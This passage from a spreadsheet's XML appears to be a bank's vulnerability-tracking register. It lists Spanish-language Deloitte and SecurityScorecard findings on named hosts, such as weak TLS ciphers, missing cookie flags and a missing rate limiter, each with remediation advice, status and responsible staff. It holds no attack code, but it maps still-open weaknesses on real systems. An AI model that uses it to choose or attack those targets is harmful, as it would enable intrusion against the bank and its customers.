    <d v="2024-09-12T00:00:00"/>
    <n v="649"/>
    <d v="2024-12-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-04-30T00:00:00"/>
    <s v="La aplicación afectada no realiza una gestión adecuada de los mensajes de error producidos en el aplicativo. Se evidencia un error de tipo NullReferenceException que revela información acerca de la Liberia utilizada para deserializar los parametros"/>
    <s v="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
    <s v="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
    <m/>
    <s v="Certificada"/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="285"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Olimpia"/>
    <s v="MAN-66e2e9c0845f3141b2ea2928"/>
    <s v="CO-24-CNMPA-009-CO-002"/>
    <x v="117"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://recidaw.olimpiait.com"/>
    <m/>
    <m/>
    <d v="2024-09-12T00:00:00"/>
    <n v="649"/>
    <d v="2024-12-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-04-30T00:00:00"/>
    <s v="La aplicación afectada no realiza una gestión adecuada de los mensajes de error producidos en el aplicativo. Se evidencia un error de tipo NullReferenceException que revela información acerca de la Liberia utilizada para deserializar los parametros"/>
    <s v="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
    <s v="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
    <m/>
    <s v="Certificada"/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="286"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Olimpia"/>
    <s v="MAN-66e2ea34845f3141b2ea2931"/>
    <s v="CO-24-CNMPA-009-CO-003"/>
    <x v="114"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4"/>
    <m/>
    <m/>
    <s v="https://recidam.olimpiait.com"/>
    <m/>
    <m/>
    <d v="2024-09-12T00:00:00"/>
    <n v="649"/>
    <d v="2024-12-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-04-30T00:00:00"/>
    <s v="Durante las pruebas realizadas se ha observado que las cookies asociadas a la gestión de la sesión del usuario no tienen aplicado el atributo de seguridad &quot;HttpOnly&quot;. Este atributo impide el robo del identificador de sesión del usuario almacenado en la cookie mediante ataques de Cross Site Scripting, ya que no permite el acceso a la misma mediante scripts del lado del cliente."/>
    <s v="Se recomienda proteger los identificadores de sesión, almacenados a través de las cookies, mediante el atributo de seguridad &quot;HttpOnly&quot;. De esta manera se evita que se pueda acceder al identificador de sesión desde secuencias de comandos (JavaScript, ActiveX)."/>
    <s v="El robo de identificadores de la sesión de un usuario a través de las cookies podría permitir a un atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación."/>
    <m/>
    <s v="Certificada"/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="287"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Olimpia"/>
    <s v="MAN-66e2ea34845f3141b2ea2932"/>
    <s v="CO-24-CNMPA-009-CO-004"/>
    <x v="114"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4"/>
    <m/>
    <m/>
    <s v="https://recidaw.olimpiait.com"/>
    <m/>
    <m/>
    <d v="2024-09-12T00:00:00"/>
    <n v="649"/>
    <d v="2024-12-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-04-30T00:00:00"/>
    <s v="Durante las pruebas realizadas se ha observado que las cookies asociadas a la gestión de la sesión del usuario no tienen aplicado el atributo de seguridad &quot;HttpOnly&quot;. Este atributo impide el robo del identificador de sesión del usuario almacenado en la cookie mediante ataques de Cross Site Scripting, ya que no permite el acceso a la misma mediante scripts del lado del cliente."/>
    <s v="Se recomienda proteger los identificadores de sesión, almacenados a través de las cookies, mediante el atributo de seguridad &quot;HttpOnly&quot;. De esta manera se evita que se pueda acceder al identificador de sesión desde secuencias de comandos (JavaScript, ActiveX)."/>
    <s v="El robo de identificadores de la sesión de un usuario a través de las cookies podría permitir a un atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación."/>
    <m/>
    <s v="Certificada"/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="288"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Olimpia"/>
    <s v="MAN-66e2ea7d845f3141b2ea2944"/>
    <s v="CO-24-CNMPA-009-CO-005"/>
    <x v="118"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="3.6"/>
    <m/>
    <m/>
    <s v="https://recidam.olimpiait.com"/>
    <m/>
    <m/>
    <d v="2024-09-12T00:00:00"/>
    <n v="649"/>
    <d v="2025-01-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-02-11T00:00:00"/>
    <s v="Durante las pruebas realizadas se ha observado que las cookies asociadas a la gestión de la sesión no tiene aplicado el atributo de seguridad &quot;secure&quot;. Este atributo indica al navegador que sólo incluya la cookie si se envía a través de un canal cifrado como es el caso del protocolo HTTPS."/>
    <s v="Se recomienda proteger los identificadores de sesión, almacenados a través de las cookies, mediante el atributo de seguridad &quot;secure&quot;. De esta manera se evitando que el identificador de sesión pueda ser transmitido por canales no cifrados."/>
    <s v="El robo de identificadores de la sesión de un usuario a través de las cookies podría permitir a un atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación."/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="289"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Olimpia"/>
    <s v="MAN-66e2ea7d845f3141b2ea2945"/>
    <s v="CO-24-CNMPA-009-CO-006"/>
    <x v="118"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="3.6"/>
    <m/>
    <m/>
    <s v="https://recidaw.olimpiait.com"/>
    <m/>
    <m/>
    <d v="2024-09-12T00:00:00"/>
    <n v="649"/>
    <d v="2025-01-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-02-11T00:00:00"/>
    <s v="Durante las pruebas realizadas se ha observado que las cookies asociadas a la gestión de la sesión no tiene aplicado el atributo de seguridad &quot;secure&quot;. Este atributo indica al navegador que sólo incluya la cookie si se envía a través de un canal cifrado como es el caso del protocolo HTTPS."/>
    <s v="Se recomienda proteger los identificadores de sesión, almacenados a través de las cookies, mediante el atributo de seguridad &quot;secure&quot;. De esta manera se evitando que el identificador de sesión pueda ser transmitido por canales no cifrados."/>
    <s v="El robo de identificadores de la sesión de un usuario a través de las cookies podría permitir a un atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación."/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="290"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Olimpia"/>
    <s v="MAN-66e301af845f3141b2ea2a05"/>
    <s v="CO-24-CNMPA-009-CO-007"/>
    <x v="153"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="https://recidam.olimpiait.com"/>
    <m/>
    <m/>
    <d v="2024-09-12T00:00:00"/>
    <n v="649"/>
    <d v="2025-01-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-02-11T00:00:00"/>
    <s v="Se ha podido comprobar que el servidor que sustenta la aplicación es vulnerable a Lucky13."/>
    <s v="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m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="291"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Olimpia"/>
    <s v="MAN-66e301af845f3141b2ea2a06"/>
    <s v="CO-24-CNMPA-009-CO-008"/>
    <x v="153"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="https://recidaw.olimpiait.com"/>
    <m/>
    <m/>
    <d v="2024-09-12T00:00:00"/>
    <n v="649"/>
    <d v="2025-01-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-02-11T00:00:00"/>
    <s v="Se ha podido comprobar que el servidor que sustenta la aplicación es vulnerable a Lucky13."/>
    <s v="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m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="292"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Olimpia"/>
    <s v="MAN-66e30220845f3141b2ea2a07"/>
    <s v="CO-24-CNMPA-009-CO-009"/>
    <x v="155"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="https://recidam.olimpiait.com"/>
    <m/>
    <m/>
    <d v="2024-09-12T00:00:00"/>
    <n v="649"/>
    <d v="2025-01-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-02-11T00:00:00"/>
    <s v="Durante la realización de las pruebas se ha podido comprobar el servidor no implementa de manera correcta las cabeceras &quot;Cache-Control&quot; ni la cabecera &quot;Pragma&quot;, ambas indicadas para controlar la información guardada en caché por el navegador._x000a__x000a_las cabeceras de respuesta del servidor en la que se puede observar que no se genera con los atributos de seguridad “Cache-control” y/o “Pragma."/>
    <s v="Las aplicaciones deben devolver las directivas de almacenamiento en caché indicando a los navegadores que no almacenen copias locales de ningún dato sensible. _x000a_A menudo, esto se puede lograr mediante la configuración del servidor web para evitar el almacenamiento en caché de rutas relevantes o cualquier otra información sensible. _x000a_Alternativamente, la mayoría de las plataformas de desarrollo web, permiten controlar las directivas de almacenamiento en caché del servidor desde scripts individuales. _x000a_Se recomienda que el servidor web devuelva las siguientes cabeceras HTTP en todas las respuestas que contengan contenido sensible: _x000a_•Cache-control: no-store _x000a_•Pragma: no-cache"/>
    <s v="A menos que se indique lo contrario, los navegadores pueden almacenar una copia en caché local del contenido recibido de los servidores web. Algunos navegadores, guardan en caché el contenido obtenido a través de HTTPS. Si la información sensible en las respuestas de la aplicación se almacena en caché local, puede ser recuperada por otros usuarios que tienen acceso a la misma computadora en un momento futuro además de ser susceptible a ataques de tipo Caché Poisoning."/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="293"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Olimpia"/>
    <s v="MAN-66e3028b845f3141b2ea2a08"/>
    <s v="CO-24-CNMPA-009-CO-010"/>
    <x v="4"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="https://recidaw.olimpiait.com"/>
    <m/>
    <m/>
    <d v="2024-09-12T00:00:00"/>
    <n v="649"/>
    <d v="2025-01-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-02-11T00:00:00"/>
    <s v="La vulnerabilidad Browser Exploit Against SSL/TLS o BEAST se produce mediante el cifrado de datos en modo CBC con vectores de inicialización encadenados, lo que permite a los atacantes intermedios obtener encabezados HTTP de texto sin formato._x000a_e muestra el resultado de la herramienta &quot;testssl” sobre el servidor afectado recidaw y recidvw que muestra que el activo es vulnerable a BEAST"/>
    <s v="Configurar los servidores SSL/TLS para soportar únicamente TLS 1.3 o TLS 1.2 si es compatible. Además, configure los servidores SSL/TLS para que solo sean compatibles con los conjuntos de cifrado que no usan algoritmos de cifrado por bloque (CBC)."/>
    <s v="La vulnerabilidad CBC puede permitir ataques contra SSL para descifrar y obtener información sensible transmitida entre el navegador del usuario y el servidor de la aplicación tales como identificadores de sesión del usuario, credenciales, etc."/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="294"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Olimpia"/>
    <s v="MAN-66e3028b845f3141b2ea2a09"/>
    <s v="CO-24-CNMPA-009-CO-011"/>
    <x v="4"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="https://recidam.olimpiait.com"/>
    <m/>
    <m/>
    <d v="2024-09-12T00:00:00"/>
    <n v="649"/>
    <d v="2025-01-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-02-11T00:00:00"/>
    <s v="La vulnerabilidad Browser Exploit Against SSL/TLS o BEAST se produce mediante el cifrado de datos en modo CBC con vectores de inicialización encadenados, lo que permite a los atacantes intermedios obtener encabezados HTTP de texto sin formato._x000a_e muestra el resultado de la herramienta &quot;testssl” sobre el servidor afectado recidaw y recidvw que muestra que el activo es vulnerable a BEAST"/>
    <s v="Configurar los servidores SSL/TLS para soportar únicamente TLS 1.3 o TLS 1.2 si es compatible. Además, configure los servidores SSL/TLS para que solo sean compatibles con los conjuntos de cifrado que no usan algoritmos de cifrado por bloque (CBC)."/>
    <s v="La vulnerabilidad CBC puede permitir ataques contra SSL para descifrar y obtener información sensible transmitida entre el navegador del usuario y el servidor de la aplicación tales como identificadores de sesión del usuario, credenciales, etc."/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="295"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Olimpia"/>
    <s v="MAN-66e302d3845f3141b2ea2a0d"/>
    <s v="CO-24-CNMPA-009-CO-012"/>
    <x v="150"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="2.5"/>
    <m/>
    <m/>
    <s v="https://recidaw.olimpiait.com"/>
    <m/>
    <m/>
    <d v="2024-09-12T00:00:00"/>
    <n v="649"/>
    <d v="2025-01-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-02-11T00:00:00"/>
    <s v="La herramienta &quot;testssl&quot; que demuestra que la renegociación insegura se encuentra habilitada en el sistema remoto"/>
    <s v="Se recomienda deshabilitar la opción de &quot;Renegociación insegura iniciada por el cliente&quot; en el fichero de configuración del servidor. De manera alternativa se recomienda mantener las librerías TLS/SSL actualizadas a la última versión disponible."/>
    <s v="Un atacante remoto no autenticado puede aprovechar la vulnerabilidad de &quot;Renegociación insegura SSL iniciada por el cliente&quot; para inyectar una cantidad arbitraria de texto sin formato en el principio de la secuencia de protocolo de aplicación, que podría facilitar los ataques man-in-the-middle. De esta manera, el atacante tendría acceso a la información transmitida e, incluso, podría llegar a modificarla."/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="296"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Olimpia"/>
    <s v="MAN-66e302d3845f3141b2ea2a0e"/>
    <s v="CO-24-CNMPA-009-CO-013"/>
    <x v="150"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="2.5"/>
    <m/>
    <m/>
    <s v="https://recidam.olimpiait.com"/>
    <m/>
    <m/>
    <d v="2024-09-12T00:00:00"/>
    <n v="649"/>
    <d v="2025-01-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-02-11T00:00:00"/>
    <s v="La herramienta &quot;testssl&quot; que demuestra que la renegociación insegura se encuentra habilitada en el sistema remoto"/>
    <s v="Se recomienda deshabilitar la opción de &quot;Renegociación insegura iniciada por el cliente&quot; en el fichero de configuración del servidor. De manera alternativa se recomienda mantener las librerías TLS/SSL actualizadas a la última versión disponible."/>
    <s v="Un atacante remoto no autenticado puede aprovechar la vulnerabilidad de &quot;Renegociación insegura SSL iniciada por el cliente&quot; para inyectar una cantidad arbitraria de texto sin formato en el principio de la secuencia de protocolo de aplicación, que podría facilitar los ataques man-in-the-middle. De esta manera, el atacante tendría acceso a la información transmitida e, incluso, podría llegar a modificarla."/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="297"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="SSO Prospera"/>
    <s v="MAN-33d542f7"/>
    <s v="SC-22-CNMPO-008-CO-007"/>
    <x v="102"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="2.6"/>
    <m/>
    <m/>
    <s v="https://sso-management.servicios.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2022-12-16T00:00:00"/>
    <n v="1285"/>
    <d v="2023-04-15T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-03-26T00:00:00"/>
    <s v="Se ha observado que el recurso afectado posiblemente no implementa un Rate Limiter (limitador de velocidad), lo que permite a los usuarios realizar varias solicitudes por segundo, en nuestro caso fuimos capaces de realizar 80 peticiones en un segundo."/>
    <s v="Se recomienda analizar la posibilidad de implementar un Rate Limiter para el recurso afectado, limitando las solicitudes por segundo y por hora para cada usuario. Además, se recomienda considerar revisar los estándares de desarrollo y configuración para asegurar que se establezcan Rate Limiters en todos los servicios y sistemas."/>
    <s v="Un Rate Limiter se usa para controlar el tráfico enviado o recibido en la API. Un usuario mal intencionado que abuse del recurso afectado podría enviar una gran cantidad de solicitudes en un intervalo de tiempo relativamente corto, con la ayuda de herramientas automatizadas, y causar una carga computacional muy alta en el servidor. Esto podría potencialmente causar una denegación del servicio y hacer que el recurso afectado no esté disponible."/>
    <m/>
    <m/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="298"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="SSO Prospera"/>
    <s v="MAN-33d542f5"/>
    <s v="SC-22-CNMPO-008-CO-005"/>
    <x v="101"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="2.6"/>
    <m/>
    <m/>
    <s v="https://sso-management.servicios.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2022-12-16T00:00:00"/>
    <n v="1285"/>
    <d v="2023-04-15T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Este ataque consiste en detectar pequeñas diferencias de tiempo cuando se producen errores TLS generados a base de mandar peticiones maliciosas al servidor. Con estos ataques es posible descifrar bloques TLS, aunque la cantidad de peticiones depende del tipo de conexión, el ruido y el algoritmo de MAC utilizado."/>
    <s v="Se recomienda deshabilitar el modo de cifrado CBC y aplicar los parches disponibles."/>
    <s v="Se ha detectado que es posible utilizar mecanismos de cifrado considerados inseguros en las comunicaciones con los servidores, lo que podría permitir a un eventual atacante comprometer la confidencialidad de la información intercambiada entre un cliente y el servidor, y en algunos casos también provocar indisponibilidad del servidor."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="299"/>
    <s v="BSNC"/>
    <s v="SecurityScorecard"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <m/>
    <m/>
    <x v="156"/>
    <m/>
    <s v="Dismissed"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2024-10-08T00:00:00"/>
    <n v="623"/>
    <d v="2025-02-05T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-01-29T00:00:00"/>
    <s v="Los registros del navegador hacen referencia a mensajes o información generados por los scripts o procesos de back-end de un sitio web que se envían directamente a la consola del navegador. Estos registros suelen incluir información de depuración, mensajes de error, advertencias u otros resultados de diagnóstico que los desarrolladores y los usuarios utilizan para solucionar problemas."/>
    <s v="- Limite los registros del navegador a la información de diagnóstico esencial._x000a__x000a_- Evite registrar datos confidenciales como credenciales de usuario o información de identificación personal._x000a__x000a_- Implementar controles para restringir el acceso a los registros del navegador únicamente al personal autorizado._x000a__x000a_- Utilice técnicas de cifrado u ofuscación para proteger la información confidencial dentro de los registros._x000a__x000a_- Revise y monitoree periódicamente los registros del navegador para detectar cualquier actividad inusual o sospechosa."/>
    <s v="El riesgo de emitir registros del navegador radica en la posible exposición de información confidencial a terceros no autorizados. Estos registros pueden revelar inadvertidamente credenciales de usuario, información de identificación personal u otros datos confidenciales, que pueden ser explotados por actores maliciosos para el robo de identidad, fraude u otros fines nefastos. Además, la exposición de detalles internos del sistema o mensajes de error puede proporcionar a los atacantes información sobre posibles vulnerabilidades o debilidades dentro de la infraestructura del sitio web."/>
    <m/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="300"/>
    <s v="BSNC"/>
    <s v="SecurityScorecard"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <m/>
    <m/>
    <x v="157"/>
    <m/>
    <s v="Dismissed"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2024-10-08T00:00:00"/>
    <n v="623"/>
    <d v="2025-02-05T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-01-29T00:00:00"/>
    <s v="Los componentes de un sitio web incluyen diferentes elementos que, en conjunto, contribuyen a la estructura, el aspecto y la funcionalidad de una página web. Estos componentes incluyen contenido de texto, imágenes, hojas de estilo que definen el diseño, scripts que permiten la interactividad, archivos multimedia, fuentes para tipografía, menús de navegación, formularios para la entrada de datos del usuario y widgets o complementos para funciones adicionales. En conjunto, estos componentes crean una experiencia de usuario coherente, que facilita la navegación, la interacción y la difusión de información en el sitio web. Cada componente desempeña un papel fundamental en la entrega de contenido, la mejora del atractivo visual y la participación del usuario._x000a__x000a_www.santander.com.co/img/sep_head_btns.png"/>
    <s v="- Optimice la entrega de componentes minimizando el tamaño de los archivos y aprovechando las técnicas de almacenamiento en caché._x000a__x000a_- Utilice redes de distribución de contenido (CDN) para distribuir componentes y mejorar la velocidad de carga._x000a__x000a_- Implementar mecanismos robustos de manejo de errores para manejar con elegancia las fallas de carga de componentes._x000a__x000a_- Utilice opciones de respaldo o contenido alternativo para componentes críticos para garantizar una experiencia de usuario perfecta, incluso en caso de fallas de carga._x000a__x000a_- Supervisar periódicamente el rendimiento del sitio web y realizar pruebas en diferentes dispositivos y condiciones de red."/>
    <s v="Cuando los componentes esenciales, como imágenes, hojas de estilo, scripts o contenido multimedia, no se cargan, pueden aparecer diseños defectuosos, funciones incompletas y una interactividad reducida. Esto genera frustración en los usuarios y una posible pérdida de participación. Además, puede afectar negativamente a la credibilidad del sitio web, la percepción de la marca y las tasas de conversión, ya que los usuarios pueden percibirlo como poco confiable o poco profesional."/>
    <m/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="301"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-6706612a7d9a8c7b25dd8df7"/>
    <s v="SC-24-CNMPO-013-AP-001"/>
    <x v="114"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="4"/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2024-10-08T00:00:00"/>
    <n v="623"/>
    <d v="2025-01-06T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas se ha observado que la cookie incap_ses_XXXX_XXXXXXX, asociada a la gestión de la sesión del usuario no tienen aplicado el atributo de seguridad &quot;HttpOnly&quot;. Este atributo impide el robo del identificador de sesión del usuario almacenado en la cookie mediante ataques de Cross Site Scripting, ya que no permite el acceso a la misma mediante scripts del lado del cliente."/>
    <s v="Se recomienda proteger los identificadores de sesión, almacenados a través de las cookies, mediante el atributo de seguridad &quot;HttpOnly&quot;. De esta manera se evita que se pueda acceder al identificador de sesión desde secuencias de comandos (JavaScript, ActiveX)."/>
    <s v="El robo de identificadores de la sesión de un usuario a través de las cookies podría permitir a un atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación."/>
    <s v="1° Fecha: 30/04/2025"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="302"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-6706616c7d9a8c7b25dd8e0c"/>
    <s v="SC-24-CNMPO-013-CO-002"/>
    <x v="158"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2024-10-08T00:00:00"/>
    <n v="623"/>
    <d v="2025-01-06T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado que el servidor web incluye la cabecera &quot;Content Security Policy&quot; configurada de forma incorrecta en las respuestas HTTP del servidor._x000a_La cabecera incluye los atributos &quot;unsafe-inline&quot; y &quot;unsafe-eval&quot;, los cuales facilitan la inyección de código malicioso mediante vulnerabilidades XSS."/>
    <s v="Para implementar esta cabecera es necesario realizar un análisis completo de la aplicación web y observar los recursos que utiliza la misma, si son locales o provienen de algún dominio externo, e incluirlos en la cabecera, ya que la propia cabecera &quot;Content Security Policy&quot; va a actuar como una lista blanca para los recursos JavaScript que pueden ser cargados en la aplicación web. _x000a_Es necesario configurar el servidor web para que devuelva la cabecera HTTP &quot;Content-Security-Policy&quot; (en ocasiones se observarán menciones de la cabecera X-Content-Security-Policy, pero se trata de una versión antigua y no es necesario configurarla). _x000a_Un ejemplo de configuración de cabecera es el siguiente: _x000a_• Content-Security-Policy: default-src 'self' *.trusted.com _x000a_Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una política, por ejemplo: _x000a_• &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src 'self'; img-src https://*; child-src 'none';&quot;&gt;_x000a__x000a_Para obtener una referencia completa acerca de todas las directivas &quot;Content Security Policy&quot; se recomienda visitar los siguientes enlaces: _x000a__x000a_• https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP _x000a_• https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html"/>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s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="303"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-670661ae7d9a8c7b25dd8e2f"/>
    <s v="SC-24-CNMPO-013-CO-003"/>
    <x v="152"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2024-10-08T00:00:00"/>
    <n v="623"/>
    <d v="2025-02-05T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante el análisis de las conexiones cifradas se ha podido comprobar que el servidor web ofrece compresión Gzip en sus conexiones."/>
    <s v="Se recomienda deshabilitar la compresión HTTP por completo, reduciendo el rendimiento. _x000a_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_x000a_A continuación, se muestra como se deshabilita la compresión HTTP para Apache y NGINX: Deshabilitar compresión en Apache: _x000a_• Deshabilite el módulo mod_deflate utilizando el siguiente comando: $ sudo a2dismod deflate _x000a_• Reinicie el servidor: $ sudo /etc/init.d/apache2 restart_x000a_Deshabilitar compresión en NGINX: _x000a_• Establezca la configuración del host con la opción gzip en off: _x000a_server { server_name www.example.com; listen 443 ssl http2; gzip off; }"/>
    <s v="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
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="304"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-670661e27d9a8c7b25dd8e52"/>
    <s v="SC-24-CNMPO-013-CO-004"/>
    <x v="153"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2024-10-08T00:00:00"/>
    <n v="623"/>
    <d v="2025-02-05T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha podido comprobar que el servidor que sustenta la aplicación es vulnerable a Lucky13. "/>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_x000a_Puede actualizar la versión de OpenSSL desde su repositorio del sistema operativo o bien descargando la última versión del siguiente enlace: _x000a_• https://www.openssl.org/source/"/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="305"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="MAN-670cd4b67d9a8c7b25e5d0af"/>
    <s v="SC-24-CNMPO-014-VE-002"/>
    <x v="132"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3.6"/>
